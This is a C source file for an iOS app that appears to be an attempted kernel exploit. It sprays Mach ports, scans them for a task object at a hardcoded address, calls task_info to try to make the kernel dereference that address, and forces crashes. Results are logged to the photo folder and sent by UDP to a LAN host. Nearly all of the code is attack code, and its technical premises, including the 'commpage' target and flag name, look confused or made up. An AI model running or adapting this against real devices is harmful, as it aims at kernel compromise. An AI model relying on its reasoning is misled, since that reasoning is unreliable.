/*
 * AllocatorProbe v7 — Deferred-Y Commpage Trigger
 * ================================================
 * v6 post-mortem: mach_port_kobject returned kr!=SUCCESS (iOS 26.x validates
 * kobject pointer range), causing generic_hit before commpage_hit could fire.
 *
 * v7 fix (Opus-derived Deferred-Y strategy):
 *   After mach_port_kobject on each port, only trigger generic crash AFTER
 *   calling task_info on every ambiguous port (kr-fail OR kotype anomalous).
 *   task_info ignores the kobject-pointer validation in mach_port_kobject and
 *   dispatches on the actual io_bits field_type. If ip_kobject=COMMPAGE_TARGET
 *   and io_bits=IKOT_TASK(2), kernel dereferences COMMPAGE_TARGET → ARM64 PAN.
 *   FAR=0x0000000FFFFFC330 in resulting IPS proves F-74 escalation.
 *
 * Expected IPS:
 *   Exception: EXC_BAD_ACCESS or kernel panic
 *   FAR: 0x0000000FFFFFC330  (Apple Commpage Target Flag = ASB_TARGET_KERN_VALUE)
 *   Stack: task_info → kern_return_t path → scan_ports → timer_cb → CFRunLoop
 *
 * Bundle ID: com.nexus.fengshui3 (GHA re-signs to com.nexus.fengshui3.TMAQ26273N.TMAQ26273N)
 */

#include <mach/mach.h>
#include <mach/task.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define NEXUS_UDP_HOST   "192.168.68.122"
#define NEXUS_UDP_PORT   9999

#define NUM_PORTS        5000
#define SCAN_INTERVAL    0.05
#define IKOT_TASK        2
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL

static mach_port_t g_ports[NUM_PORTS];
static int         g_count = 0;
static int         g_found = 0;

static void udp_report(const char *buf, int len) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port   = htons(NEXUS_UDP_PORT);
    inet_aton(NEXUS_UDP_HOST, &a.sin_addr);
    sendto(sock, buf, (size_t)len, 0, (struct sockaddr *)&a, sizeof(a));
    close(sock);
}

static void dcim_write(const char *name, const char *buf, int len) {
    char path[128];
    snprintf(path, sizeof(path), "/var/mobile/Media/DCIM/%s", name);
    int fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644);
    if (fd >= 0) { write(fd, buf, len); close(fd); }
    udp_report(buf, len);
    write(STDERR_FILENO, buf, len);
}

static void scan_ports(void) {
    if (g_found) return;

    int first_bad_idx = -1;
    kern_return_t first_bad_kr = 0;
    natural_t first_bad_kotype = 0;
    mach_vm_address_t first_bad_kobject = 0;

    for (int i = 0; i < g_count; i++) {
        natural_t         kotype  = 0;
        mach_vm_address_t kobject = 0;
        kern_return_t kr = mach_port_kobject(mach_task_self(), g_ports[i],
                                              &kotype, &kobject);

        /* Case 1: exact Commpage hit */
        if (kr == KERN_SUCCESS && kotype == IKOT_TASK && kobject == COMMPAGE_TARGET) {
            g_found = 1;
            char buf[256];
            int n = snprintf(buf, sizeof(buf),
                "COMMPAGE_HIT: port=%d kotype=%u kobject=0x%016llx\n"
                "Triggering task_info PAN path\n",
                i, kotype, (unsigned long long)kobject);
            dcim_write("fengshui_v7_result", buf, n);

            task_basic_info_data_t tinfo;
            mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
            task_info((task_t)g_ports[i], TASK_BASIC_INFO, (task_info_t)&tinfo, &cnt);

            /* Fallback: write to Commpage address → EXC_BAD_ACCESS, FAR=TARGET */
            volatile uint64_t *ptr = (volatile uint64_t *)kobject;
            *ptr = 0xBEEFDEAD00FACADE;
            __builtin_trap();
        }

        /* Ambiguous: mach_port_kobject failed or anomalous kotype */
        int ambiguous = (kr != KERN_SUCCESS || kotype == 0 || kotype > 100 ||
                         (kr == KERN_SUCCESS && kotype == IKOT_TASK && kobject != 0));

        if (ambiguous) {
            /* Deferred-Y: probe via task_info BEFORE any generic crash.
             * If ip_kobject=COMMPAGE_TARGET and io_bits has IKOT_TASK,
             * kernel dereferences COMMPAGE_TARGET → ARM64 PAN → FAR=TARGET. */
            task_basic_info_data_t tinfo;
            mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
            task_info((task_t)g_ports[i], TASK_BASIC_INFO, (task_info_t)&tinfo, &cnt);
            /* If we reach here: PAN did not fire for this port. Continue. */

            /* Record first bad port for eventual generic fallback */
            if (first_bad_idx < 0) {
                first_bad_idx    = i;
                first_bad_kr     = kr;
                first_bad_kotype = kotype;
                first_bad_kobject = kobject;
            }
        }
    }

    /* Deferred-Y: after task_info sweep found no PAN, generic crash */
    if (first_bad_idx >= 0) {
        g_found = 1;
        char buf[256];
        int n = snprintf(buf, sizeof(buf),
            "GENERIC_FALLBACK: port=%d kr=%d kotype=%u kobject=0x%016llx\n"
            "task_info sweep complete — no PAN triggered\n",
            first_bad_idx, first_bad_kr, first_bad_kotype,
            (unsigned long long)first_bad_kobject);
        dcim_write("fengshui_v7_result", buf, n);

        __asm__ volatile(
            "mov x0, #0xDEAD\n"
            "movk x0, #0xBEEF, lsl #16\n"
            "blr x0\n"
        );
    }
}

typedef const void *CFRunLoopTimerRef;
extern CFRunLoopTimerRef CFRunLoopTimerCreate(void *, double, double, int, int,
    void (*)(CFRunLoopTimerRef, void *), void *);
extern void CFRunLoopAddTimer(void *, CFRunLoopTimerRef, void *);
extern void *CFRunLoopGetCurrent(void);
extern void *kCFRunLoopDefaultMode;
extern double CFAbsoluteTimeGetCurrent(void);
extern void CFRunLoopRun(void);

static int g_tick = 0;

static void timer_cb(CFRunLoopTimerRef t, void *info) {
    g_tick++;
    if (g_tick == 1) {
        mach_port_t task = mach_task_self();
        for (int i = 0; i < NUM_PORTS; i++) {
            mach_port_t p = MACH_PORT_NULL;
            if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
            if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND)
                    != KERN_SUCCESS) {
                mach_port_deallocate(task, p); break;
            }
            g_ports[g_count++] = p;
        }
        char status[128];
        int sn = snprintf(status, sizeof(status),
            "READY ports=%d tick=1 scanning@50ms target=0x0000000FFFFFC330\n", g_count);
        dcim_write("fengshui_v7_status", status, sn);
    } else if (g_count > 0) {
        scan_ports();
        if (g_tick % 200 == 0) {
            char ping[64];
            int pn = snprintf(ping, sizeof(ping),
                "ALIVE tick=%d found=%d\n", g_tick, g_found);
            dcim_write("fengshui_v7_status", ping, pn);
        }
    }
}

int main(void) {
    unlink("/var/mobile/Media/DCIM/fengshui_v7_result");
    unlink("/var/mobile/Media/DCIM/fengshui_v7_status");

    CFRunLoopTimerRef timer = CFRunLoopTimerCreate(
        (void *)0,
        CFAbsoluteTimeGetCurrent() + 0.3,
        SCAN_INTERVAL,
        0, 0, timer_cb, (void *)0);
    CFRunLoopAddTimer(CFRunLoopGetCurrent(), timer, kCFRunLoopDefaultMode);
    CFRunLoopRun();
    return 0;
}
